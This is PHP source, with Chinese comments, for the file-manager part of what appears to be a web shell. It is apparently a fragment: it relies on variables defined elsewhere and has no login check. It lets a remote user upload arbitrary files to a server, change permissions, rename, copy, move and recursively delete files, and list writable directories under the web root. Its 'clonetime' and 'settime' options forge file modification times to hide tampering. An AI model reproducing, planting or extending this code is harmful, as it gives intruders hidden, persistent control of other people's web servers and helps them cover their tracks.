
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
                <?php

                $charset='utf8';
                $home_cwd = getcwd();


                $cwd = getcwd();
                $web_cwd = $_SERVER['DOCUMENT_ROOT'];


                define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
                define('SELF', $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);
                define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
                define('IS_GPC', get_magic_quotes_gpc());
                chdir(SA_ROOT);
                $dis_func = get_cfg_var('disable_functions');

                    // 判断当前目录可写情况
                    $dir_writeable = @is_writable($cwd) ? 'Writable' : 'Non-writable';
                    if (isset($p1)) {
                        switch($p1) {
                            case 'createdir':
                                // 创建目录
                                if ($p2) {
                                    m('Directory created '.(@mkdir($cwd.$p2,0777) ? 'success' : 'failed'));
                                }
                                break;
                            case 'uploadFile':
                                // 上传文件
                                m('File upload '.(@move_uploaded_file($_FILES['uploadfile']['tmp_name'], $cwd.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
                                break;
                            case 'fileperm':
                                // 编辑文件属性
                                if ($p2 && $p3) {
                                    $p3 = base_convert($p3, 8, 10);
                                    m('Set file permissions '.(@chmod($p2, $p3) ? 'success' : 'failed'));
                                }
                                break;
                            case 'rename':
                                // 改名
                                if ($p2 && $p3) {
                                    m($p3.' renamed '.$p2.(@rename($p3, $p2) ? ' success' : ' failed'));
                                }
                                break;
                            case 'clonetime':
                                // 克隆时间
                                if ($p2 && $p3) {
                                    $time = @filemtime($p3);
                                    m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));
                                }
                                break;
                            case 'settime':
                                // 自定义时间
                                if ($p2 && $p3) {
                                    $time = strtotime($p3);
                                    m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));
                                }
                                break;
                            case 'delete':
                                // 批量删除文件
                                if ($P['dl']) {
                                    $succ = $fail = 0;
                                    foreach ($P['dl'] as $f) {
                                        if (is_dir($cwd.$f)) {
                                            if (@deltree($cwd.$f)) {
                                                $succ++;
                                            } else {
                                                $fail++;
                                            }
                                        } else {
                                            if (@unlink($cwd.$f)) {
                                                $succ++;
                                            } else {
                                                $fail++;
                                            }
                                        }
                                    }
                                    m('Deleted folder/file(s) have finished, choose '.count($P['dl']).', success '.$succ.', fail '.$fail);
                                } else {
                                    m('Please select folder/file(s)');
                                }
                                break;
                            case 'paste':
                                if($_SESSION['do'] == 'copy') {
                                    foreach($_SESSION['dl'] as $f) {
                                        copy_paste($_SESSION['c'],$f, $cwd);
                                    }
                                } elseif($_SESSION['do'] == 'move') {
                                    foreach($_SESSION['dl'] as $f) {
                                        @rename($_SESSION['c'].$f, $cwd.$f);
                                    }
                                }
                                unset($_SESSION['do'], $_SESSION['dl'], $_SESSION['c']);
                                break;
                            default:
                                if($p1 == 'copy' || $p1 == 'move') {
                                    if (isset($P['dl']) && count($P['dl'])) {
                                        $_SESSION['do'] = $p1;
                                        $_SESSION['dl'] = $P['dl'];
                                        $_SESSION['c'] = $P['cwd'];
                                        m('Have been copied to the session');
                                    } else {
                                        m('Please select folder/file(s)');
                                    }
                                }
                                break;
                        }
                        echo "<script type=\"text/javascript\">$('opform').p1.value='';$('opform').p2.value='';</script>";
                    }
                    //操作完毕
                    $free = @disk_free_space($cwd);
                    !$free && $free = 0;
                    $all = @disk_total_space($cwd);
                    !$all && $all = 0;
                    $used = $all-$free;
                    p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)</h2>');

                    $cwd_links = '';
                    $path = explode('/', $cwd);
                    $n=count($path);
                    for($i=0;$i<$n-1;$i++) {
                        $cwd_links .= '<a href="javascript:g(\'file\', \'';
                        for($j=0;$j<=$i;$j++) {
                            $cwd_links .= $path[$j].'/';
                        }
                        $cwd_links .= '\');">'.$path[$i].'/</a>';
                    }

                    ?>
                    <script type="text/javascript">
                        document.onclick = shownav;
                        function shownav(e){
                            var src = e?e.target:event.srcElement;
                            do{
                                if(src.id =="jumpto") {
                                    $('inputnav').style.display = "";
                                    $('pathnav').style.display = "none";
                                    return;
                                }
                                if(src.id =="inputnav") {
                                    return;
                                }
                                src = src.parentNode;
                            }while(src.parentNode)

                            $('inputnav').style.display = "none";
                            $('pathnav').style.display = "";
                        }
                    </script>
                    <div style="background:#eee;margin-bottom:10px;">
                        <form onsubmit="g('file',this.cwd.value);return false;" method="POST" id="godir" name="godir">
                            <table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
                                <tr>
                                    <td width="100%"><?php echo $cwd_links.' - '.getChmod($cwd).' / '.PermsColor($cwd).getUser($cwd);?> (<?php echo $dir_writeable;?>)</td>
                                    <td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
                                </tr>
                            </table>
                            <table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
                                <tr>
                                    <td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($cwd);?>)</td>
                                    <td width="100%"><input class="input" name="cwd" value="<?php echo $cwd;?>" type="text" style="width:99%;margin:0 8px;"></td>
                                    <td nowrap><input class="bt" value="GO" type="submit"></td>
                                </tr>
                            </table>
                        </form>
                        <?php
                        if (IS_WIN) {
                            $comma = '';
                            p('<div class="drives">');
                            foreach( range('A','Z') as $drive ) {
                                if (is_dir($drive.':/')) {
                                    p($comma.'<a href="javascript:g(\'file\', \''.$drive.':/\');">'.$drive.':\</a>');
                                    $comma = '<span>|</span>';
                                }
                            }
                            p('</div>');
                        }
                        ?>
                    </div>
                    <?php
                    p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
                    p('<tr class="alt1"><td colspan="6" style="padding:5px;line-height:20px;">');
                    p('<form action="'.SELF.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input name="uploadfile" value="" type="file" /> <input class="bt" value="Upload" type="submit" /><input name="charset" value="'.$charset.'" type="hidden" /><input type="hidden" name="p1" value="uploadFile"><input name="cwd" value="'.$cwd.'" type="hidden" /></div></form>');
                    p('<a href="javascript:g(\'file\', \''.str_replace('\\','/',$web_cwd).'\');">WebRoot</a>');
                    p(' | <a href="javascript:g(\'file\', \''.$home_cwd.'\');">ScriptPath</a>');
                    p(' | <a href="javascript:g(\'file\',\''.$cwd.'\',null,null,null,\'dir\');">View Writable Directory</a> ');
                    p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile();">Create File</a>');
                    p('</td></tr>');

                    $sort = array('filename', 1);


                    formhead(array('name'=>'flist'));
                    makehide('act','file');
                    makehide('p1','');
                    makehide('cwd',$cwd);
                    makehide('charset',$charset);
                    p('<tr class="head">');
                    p('<td width="2%" nowrap><input name="chkall" value="on" type="checkbox" onclick="checkall(this.form)" /></td>');
                    p('<td><a href="javascript:g(\'file\',null,\'s_filename_'.($sort[1]?0:1).'\');">Filename</a> </td>');
                    p('<td width="16%"><a href="javascript:g(\'file\',null,\'s_mtime_'.($sort[1]?0:1).'\');">Last modified</a> </td>');
                    p('<td width="10%"><a href="javascript:g(\'file\',null,\'s_size_'.($sort[1]?0:1).'\');">Size</a> </td>');
                    p('<td width="20%">Chmod / Perms</td>');
                    p('<td width="22%">Action</td>');
                    p('</tr>');

                    //查看所有可写文件和目录
                    $dirdata=$filedata=array();


                        // 默认目录列表
                        $dirs = @scandir($cwd);
                        if ($dirs) {
                            $dirs = array_diff($dirs, array('.'));
                            foreach ($dirs as $file) {
                                $filepath=$cwd.'/'.$file;
                                if(@is_dir($filepath)){
                                    $dirdb['filename']=$file;
                                    $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
                                    $dirdb['chmod']=getChmod($filepath);
                                    $dirdb['perm']=PermsColor($filepath);
                                    $dirdb['owner']=getUser($filepath);
                                    $dirdb['link']=$filepath;
                                    if ($file=='..') {
                                        $dirdata['up']=1;
                                    } else {
                                        $dirdata[]=$dirdb;
                                    }
                                } else {
                                    $filedb['filename']=$file;
                                    //$filedb['size']=@filesize($filepath);
                                    $filedb['size']=sprintf("%u", @filesize($filepath));
                                    $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
                                    $filedb['chmod']=getChmod($filepath);
                                    $filedb['perm']=PermsColor($filepath);
                                    $filedb['owner']=getUser($filepath);
                                    $filedb['link']=$filepath;
                                    $filedata[]=$filedb;
                                }
                            }
                            unset($dirdb);
                            unset($filedb);
                    }
                    $dir_i = '0';
                    if (isset($dirdata['up'])) {
                        $thisbg = bg();
                        p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                        p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:g(\'file\',\''.getUpPath($cwd).'\');">Parent Directory</a></td>');
                        p('</tr>');
                    }
                    unset($dirdata['up']);
                    usort($dirdata, 'cmp');
                    usort($filedata, 'cmp');
                    foreach($dirdata as $key => $dirdb){

                            $attachsize = '<a href="javascript:g(\'file\', null, \'getsize\', \''.$dirdb['filename'].'\');">Stat</a>';
                        $thisbg = bg();
                        p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                        p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$dirdb['filename'].'"></td>');
                        p('<td><a href="javascript:g(\'file\',\''.$dirdb['link'].'\')">'.$dirdb['filename'].'</a></td>');
                        p('<td nowrap><a href="javascript:g(\'newtime\',null,\''.$dirdb['filename'].'\');">'.$dirdb['mtime'].'</a></td>');
                        p('<td nowrap>'.$attachsize.'</td>');
                        p('<td nowrap>');
                        p('<a href="javascript:fileperm(\''.$dirdb['filename'].'\', \''.$dirdb['chmod'].'\');">'.$dirdb['chmod'].'</a> / ');
                        p('<a href="javascript:fileperm(\''.$dirdb['filename'].'\', \''.$dirdb['chmod'].'\');">'.$dirdb['perm'].'</a>'.$dirdb['owner'].'</td>');
                        p('<td nowrap><a href="javascript:rename(\''.$dirdb['filename'].'\');">Rename</a></td>');
                        p('</tr>');
                        $dir_i++;
                    }

                    p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
                    $file_i = '0';

                    foreach($filedata as $key => $filedb){
                        $fileurl = '/'.str_replace($web_cwd,'',$filedb['link']);
                        $thisbg = bg();
                        p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                        p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$filedb['filename'].'"></td>');
                        p('<td>'.((strpos($filedb['link'], $web_cwd) !== false) ? '<a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a>' : $filedb['filename']).'</td>');
                        p('<td nowrap><a href="javascript:g(\'newtime\',null,\''.$filedb['filename'].'\');">'.$filedb['mtime'].'</a></td>');
                        p('<td nowrap>'.sizecount($filedb['size']).'</td>');
                        p('<td nowrap>');
                        p('<a href="javascript:fileperm(\''.$filedb['filename'].'\', \''.$filedb['chmod'].'\');">'.$filedb['chmod'].'</a> / ');
                        p('<a href="javascript:fileperm(\''.$filedb['filename'].'\', \''.$filedb['chmod'].'\');">'.$filedb['perm'].'</a>'.$filedb['owner'].'</td>');
                        p('<td nowrap>');
                        p('<a href="javascript:g(\'down\',null,\''.$filedb['filename'].'\');">Down</a> | ');
                        p('<a href="javascript:g(\'editfile\',null,null,\''.$filedb['filename'].'\');">Edit</a> | ');
                        p('<a href="javascript:rename(\''.$filedb['filename'].'\');">Rename</a>');
                        p('</td></tr>');
                        $file_i++;
                    }
                    p('<tr class="'.bg().' head"><td colspan="5"><a href="#" onclick="$(\'flist\').p1.value=\'delete\';$(\'flist\').submit();">Delete</a> | <a href="#" onclick="$(\'flist\').p1.value=\'copy\';$(\'flist\').submit();">Copy</a> | <a href="#" onclick="$(\'flist\').p1.value=\'move\';$(\'flist\').submit();">Move</a>'.(isset($_SESSION['do']) && @count($_SESSION['dl']) ? ' | <a href="#" onclick="$(\'flist\').p1.value=\'paste\';$(\'flist\').submit();">Paste</a>' : '').'</td><td align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
                    p('</form></table>');




function getChmod($file){
    return substr(base_convert(@fileperms($file),10,8),-4);
}

function PermsColor($f) {
    if (!is_readable($f)) {
        return '<span class="red">'.getPerms($f).'</span>';
    } elseif (!is_writable($f)) {
        return '<span class="black">'.getPerms($f).'</span>';
    } else {
        return '<span class="green">'.getPerms($f).'</span>';
    }
}
function getPerms($file) {
    $mode = @fileperms($file);
    if (($mode & 0xC000) === 0xC000) {$type = 's';}
    elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
    elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
    elseif (($mode & 0x8000) === 0x8000) {$type = '-';}
    elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
    elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
    elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
    else {$type = '?';}

    $owner['read'] = ($mode & 00400) ? 'r' : '-';
    $owner['write'] = ($mode & 00200) ? 'w' : '-';
    $owner['execute'] = ($mode & 00100) ? 'x' : '-';
    $group['read'] = ($mode & 00040) ? 'r' : '-';
    $group['write'] = ($mode & 00020) ? 'w' : '-';
    $group['execute'] = ($mode & 00010) ? 'x' : '-';
    $world['read'] = ($mode & 00004) ? 'r' : '-';
    $world['write'] = ($mode & 00002) ? 'w' : '-';
    $world['execute'] = ($mode & 00001) ? 'x' : '-';

    if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
    if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
    if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}

    return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
}

function getUser($file)	{
    if (function_exists('posix_getpwuid')) {
        $array = @posix_getpwuid(@fileowner($file));
        if ($array && is_array($array)) {
            return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
        }
    }
    return '';
}

function copy_paste($c,$f,$d){
    if(is_dir($c.$f)){
        mkdir($d.$f);
        $dirs = scandir($c.$f);
        if ($dirs) {
            $dirs = array_diff($dirs, array('..', '.'));
            foreach ($dirs as $file) {
                copy_paste($c.$f.'/',$file, $d.$f.'/');
            }
        }
    } elseif(is_file($c.$f)) {
        copy($c.$f, $d.$f);
    }
}
// 删除目录
function deltree($deldir) {
    $dirs = @scandir($deldir);
    if ($dirs) {
        $dirs = array_diff($dirs, array('..', '.'));
        foreach ($dirs as $file) {
            if((is_dir($deldir.'/'.$file))) {
                @chmod($deldir.'/'.$file,0777);
                deltree($deldir.'/'.$file);
            } else {
                @chmod($deldir.'/'.$file,0777);
                @unlink($deldir.'/'.$file);
            }
        }
        @chmod($deldir,0777);
        return @rmdir($deldir) ? 1 : 0;
    } else {
        return 0;
    }
}

// 表格行间的背景色替换
function bg() {
    global $bgc;
    return ($bgc++%2==0) ? 'alt1' : 'alt2';
}

function cmp($a, $b) {
    global $sort;
    if(is_numeric($a[$sort[0]])) {
        return (($a[$sort[0]] < $b[$sort[0]]) ? -1 : 1)*($sort[1]?1:-1);
    } else {
        return strcmp($a[$sort[0]], $b[$sort[0]])*($sort[1]?1:-1);
    }
}

// 获取当前目录的上级目录
function getUpPath($cwd) {
    $pathdb = explode('/', $cwd);
    $num = count($pathdb);
    if ($num > 2) {
        unset($pathdb[$num-1],$pathdb[$num-2]);
    }
    $uppath = implode('/', $pathdb).'/';
    $uppath = str_replace('//', '/', $uppath);
    return $uppath;
}

// 检查PHP配置参数
function getcfg($varname) {
    $result = get_cfg_var($varname);
    if ($result == 0) {
        return 'No';
    } elseif ($result == 1) {
        return 'Yes';
    } else {
        return $result;
    }
}

// 获得文件扩展名
function getext($file) {
    $info = pathinfo($file);
    return $info['extension'];
}
function GetWDirList($path){
    global $dirdata,$j,$web_cwd;
    !$j && $j=1;
    $dirs = @scandir($path);
    if ($dirs) {
        $dirs = array_diff($dirs, array('..','.'));
        foreach ($dirs as $file) {
            $f=str_replace('//','/',$path.'/'.$file);
            if(is_dir($f)){
                if (is_writable($f)) {
                    $dirdata[$j]['filename']='/'.str_replace($web_cwd,'',$f);
                    $dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                    $dirdata[$j]['chmod']=getChmod($f);
                    $dirdata[$j]['perm']=PermsColor($f);
                    $dirdata[$j]['owner']=getUser($f);
                    $dirdata[$j]['link']=$f;
                    $j++;
                }
                GetWDirList($f);
            }
        }
        return $dirdata;
    } else {
        return array();
    }
}
function sizecount($size) {
    $unit = array('Bytes', 'KB', 'MB', 'GB', 'TB','PB');
    for ($i = 0; $size >= 1024 && $i < 5; $i++) {
        $size /= 1024;
    }
    return round($size, 2).' '.$unit[$i];
}
function p($str){
    echo $str."\n";
}

function makehide($name,$value=''){
    p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}

function makeinput($arg = array()){
    $arg['size'] = isset($arg['size']) && $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
    $arg['type'] = isset($arg['type']) ? $arg['type'] : 'text';
    $arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';
    $arg['class'] = isset($arg['class']) ? $arg['class'] : 'input';
    $arg['name'] = isset($arg['name']) ? $arg['name'] : '';
    $arg['value'] = isset($arg['value']) ? $arg['value'] : '';
    if (isset($arg['newline'])) p('<p>');
    p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] />");
    if (isset($arg['newline'])) p('</p>');
}

function makeselect($arg = array()){
    $onchange = isset($arg['onchange']) ? 'onchange="'.$arg['onchange'].'"' : '';
    $arg['title'] = isset($arg['title']) ? $arg['title'] : '';
    $arg['name'] = isset($arg['name']) ? $arg['name'] : '';
    p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
    if (is_array($arg['option'])) {
        foreach ($arg['option'] as $key=>$value) {
            if ($arg['selected']==$key) {
                p("<option value=\"$key\" selected>$value</option>");
            } else {
                p("<option value=\"$key\">$value</option>");
            }
        }
    }
    p("</select>");
}
function formhead($arg = array()) {
    !isset($arg['method']) && $arg['method'] = 'post';
    !isset($arg['name']) && $arg['name'] = 'form1';
    $arg['extra'] = isset($arg['extra']) ? $arg['extra'] : '';
    $arg['onsubmit'] = isset($arg['onsubmit']) ? "onsubmit=\"$arg[onsubmit]\"" : '';
    p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"".SELF."\" method=\"$arg[method]\" $arg[onsubmit] $arg[extra]>");
    if (isset($arg['title'])) {
        p('<h2>'.$arg['title'].' &raquo;</h2>');
    }
}

function maketext($arg = array()){
    $arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';
    $arg['name'] = isset($arg['name']) ? $arg['name'] : '';
    p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"100\" rows=\"25\">$arg[value]</textarea></p>");
}

function formfooter($name = ''){
    !$name && $name = 'submit';
    p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"></p>');
    p('</form>');
}

    ?>